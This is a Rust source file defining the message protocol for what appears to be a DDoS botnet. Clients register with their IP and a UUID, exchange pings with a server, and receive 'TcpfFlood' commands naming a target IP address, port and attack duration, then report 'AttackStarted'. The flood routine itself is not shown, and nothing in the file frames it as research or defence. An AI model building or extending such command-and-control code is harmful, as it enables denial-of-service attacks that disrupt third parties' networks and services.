use std::{net::Ipv4Addr, time::Duration};

use anyhow::Result;
#[derive(Clone, bitcode::Encode, bitcode::Decode, Debug)]
pub enum Messages {
    ClientInit(ClientInitPacket),
    ClientPing(u16),
    ClientPong(u16),
    ServerPing(u16),
    ServerPong(u16),
    TcpfFlood(TcpFloodPacket),
    AttackStarted(u16),
}
#[derive(Clone, bitcode::Encode, bitcode::Decode, Debug)]
pub struct ClientInitPacket {
    pub ip: String,
    pub uuid: String,
}
#[derive(Clone, bitcode::Encode, bitcode::Decode, Debug)]
pub struct TcpFloodPacket {
    pub ip: Ipv4Addr,
    pub port: u16,
    pub time: Duration,
}
impl Messages {
    pub fn new_packet(packet: Messages) -> Result<Vec<u8>> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&bitcode::encode(&packet)?);
        Ok(buf)
    }
}
